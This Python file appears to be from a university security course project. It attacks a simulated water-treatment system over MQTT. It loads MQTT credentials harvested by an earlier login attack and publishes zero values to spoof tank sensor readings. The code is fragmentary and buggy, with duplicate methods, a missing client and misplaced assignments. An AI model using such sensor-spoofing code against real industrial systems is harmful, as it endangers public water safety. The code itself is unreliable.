from app.enums.sensor_names import SensorNames
import paho.mqtt.client as mqtt
import re
import time

class SpicyIot():
    def __init__(self, name: str, broker_address: str= "localhost", port: int = 1883, db_host: str = "localhost"):
        self.broker_address = broker_address
        self.port = port
        self.name = name
        self.topic = name
        # self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
        # self.client.username_pw_set(, self.passwd)

    def extract_mqtt_credentials():
        filepath = "/home/rami/Documents/INF6103_Final_Project/attack/successful_logins.txt"
        """
        Read successful logins and populate dict
        """
        sensors_credentials = {}
        try:
            with open(filepath, "r") as successful_logins:
                for line in successful_logins:
                    # in case the file accidentally contains unsuccessful ones or maybe some gibberish
                    match = re.search(r"MQTT Login Successful: (.+)/(.+)", line) # (.+)/(.+) --> regex to retrieve those two elements
                    iot_name, iot_password = match.groups()
                    print(iot_name, iot_password)
                    
        except FileNotFoundError:
            print(f"Error: File not found: {filepath}")
            return None

        return sensors_credentials
    
    def mqtt_connect(self):
        pass

    def mqtt_publish(self, message: str):
        pass
        self.untreated_tank_sensor_names = [
            SensorNames.UNTREATED_TANK_TEMP.value,
            SensorNames.UNTREATED_TANK_CONDUCTIVITY.value,
            SensorNames.UNTREATED_TANK_DISSOLVED_OX.value,
            SensorNames.UNTREATED_TANK_TURBIDITY.value,
            SensorNames.UNTREATED_TANK_PH.value
        ]
        self.treated_tank_sensor_names = [
            SensorNames.TREATED_TANK_TEMP.value,
            SensorNames.TREATED_TANK_CONDUCTIVITY.value,
            SensorNames.TREATED_TANK_DISSOLVED_OX.value,
            SensorNames.TREATED_TANK_TURBIDITY.value,
            SensorNames.TREATED_TANK_PH.value
        ]
        self.untreated_tank_input_pipe_actuator_names = []
        self.untreated_tank_output_pipe_actuator_names = []
        self.retreatment_pipe_actuator_names = []
        self.treated_tank_output_pipe_actuator_names = []

    
    def mqtt_publish(self):
        if self.client.is_connected():
            message = 0 # We want to set all tank sensors to 0
            result = self.client.publish(self.topic, message)
            status = result.rc
            if status == 0:
                print(f"Message `{message}` sent to topic `{self.topic}`")
            else:
                print(f"Failed to send message to topic `{self.topic}`")

    def connect(self):
        self.client.connect(self.broker_address, self.port)
        self.client.loop_start()  # Start the network loop
        # Keep the script running
        try:
            while True:
                if not self.client.is_connected():
                    print("Waiting for connection...")
                    time.sleep(1)
                else:
                    self.mqtt_publish()
                    time.sleep(1)
        except KeyboardInterrupt:
            self.client.loop_stop()
            self.client.disconnect()

iot = SpicyIot("spicy_iot")
iot.extract_mqtt_credentials()